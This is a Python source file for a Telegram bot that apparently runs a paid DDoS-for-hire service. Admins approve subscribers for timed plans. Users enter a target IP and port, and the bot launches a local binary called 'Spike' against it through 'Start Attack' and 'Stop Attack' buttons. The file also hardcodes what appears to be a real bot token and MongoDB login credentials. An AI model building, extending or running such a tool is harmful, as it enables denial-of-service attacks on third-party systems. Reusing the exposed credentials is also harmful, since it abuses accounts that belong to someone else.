import subprocess
import re
from datetime import datetime, timedelta
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
import pymongo

# Configuration
TOKEN = "7113594297:AAFGKFna_ZFdWrSZAwxZP-MWXQiOGXVcpzo"  # Replace with your Telegram bot token
ADMIN_IDS = {885130831}  # Replace with your actual admin user ID(s)

# MongoDB setup
mongo_client = pymongo.MongoClient("mongodb+srv://Magic:Spike@cluster0.fa68l.mongodb.net/TEST?retryWrites=true&w=majority&appName=Cluster0")
db = mongo_client["TEST"]
users_collection = db["V-4"]

# Path to your binary
BINARY_PATH = "./Spike"

# Global variables
process = None
target_ip = None
target_port = None

# Validate IP address
def is_valid_ip(ip):
    pattern = re.compile(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$")
    return pattern.match(ip)

# Validate port number
def is_valid_port(port):
    return 1 <= port <= 65535

# Start command: Show Attack button if approved
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data = users_collection.find_one({"user_id": user_id})

    if user_data is None or user_data.get("expiration_date") < datetime.now():
        await update.message.reply_text("You are not authorized to use this bot.")
        return
    
    keyboard = [[KeyboardButton("Attack")]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    await update.message.reply_text("Press the Attack button to start configuring the attack.", reply_markup=reply_markup)

# Handle approval command
async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])
    plan_value = int(context.args[1])  # Expecting 100 or 200
    days = int(context.args[2])
    
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to approve users.")
        return

    if plan_value not in [100, 200]:
        await update.message.reply_text("Invalid plan. Please use 100 or 200.")
        return

    expiration_date = datetime.now() + timedelta(days=days)
    users_collection.update_one(
        {"user_id": user_id}, 
        {"$set": {"plan": plan_value, "expiration_date": expiration_date}}, 
        upsert=True
    )
    await update.message.reply_text(f"User {user_id} has been approved with plan {plan_value} for {days} days.")

# Handle disapproval command
async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = int(context.args[0])

    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("You are not authorized to disapprove users.")
        return

    users_collection.delete_one({"user_id": user_id})
    await update.message.reply_text(f"User {user_id} has been disapproved and removed from the system.")

# Handle button clicks
async def attack_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Please provide the target IP and port in the format: `<IP> <PORT>`")

# Handle target and port input
async def handle_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    user_id = update.effective_user.id

    user_data = users_collection.find_one({"user_id": user_id})
    if user_data is None or user_data.get("expiration_date") < datetime.now():
        await update.message.reply_text("You are not authorized to use this bot.")
        return

    # Trim whitespace from the input
    input_text = update.message.text.strip()

    try:
        target, port = input_text.split()
        target_ip = target.strip()  # Trim whitespace from IP
        target_port = int(port.strip())  # Trim whitespace from port

        if not is_valid_ip(target_ip):
            await update.message.reply_text("Invalid IP address. Please enter a valid IP.")
            return
        
        if not is_valid_port(target_port):
            await update.message.reply_text("Port must be between 1 and 65535.")
            return

        # Show Start, Stop, and Reset buttons after input is received
        keyboard = [
            [KeyboardButton("Start Attack"), KeyboardButton("Stop Attack")],
            [KeyboardButton("Reset")]
        ]
        reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
        await update.message.reply_text(f"Target: {target_ip}, Port: {target_port} configured.\n"
                                         "Now choose an action:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text("Invalid format. Please enter in the format: `<IP> <PORT>`")

# Start the attack
async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process, target_ip, target_port
    user_id = update.effective_user.id

    if target_ip is None or target_port is None:
        await update.message.reply_text("Please configure the target and port first.")
        return

    if process and process.poll() is None:
        await update.message.reply_text("Attack is already running. Please stop it before starting a new one.")
        return

    try:
        # Run the binary with target and port
        process = subprocess.Popen([BINARY_PATH, target_ip, str(target_port)], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        # Respond with a clean message
        await update.message.reply_text(f"🚀 Attack started on {target_ip}:{target_port}.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {e}")

# Stop the attack
async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global process
    if process is None:
        await update.message.reply_text("No attack is currently running.")
        return

    try:
        process.terminate()  # Attempt to terminate the process
        process.wait(timeout=5)  # Wait a moment to allow the process to stop
        process = None  # Reset process to None after stopping
        await update.message.reply_text("🛑 Attack stopped successfully.")
    except subprocess.TimeoutExpired:
        process.kill()  # Force kill if it takes too long
        process = None
        await update.message.reply_text("❌ Attack did not stop in time, forcefully killed.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error stopping attack: {e}")

# Reset the attack settings
async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global target_ip, target_port
    target_ip = None
    target_port = None
    await update.message.reply_text("🔄 Attack settings reset. Please provide new target and port.")

# Main function to start the bot
def main():
    # Create Application object with your bot's token
    application = Application.builder().token(TOKEN).build()

    # Register command handler for /start
    application.add_handler(CommandHandler("start", start))

    # Register command handlers for user approval/disapproval
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("disapprove", disapprove_user))

    # Register button handler for Attack
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Attack$'), attack_button))

    # Register button handlers
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Start Attack$'), start_attack))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Stop Attack$'), stop_attack))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex('^Reset$'), reset))

    # Handle user input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_input))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()
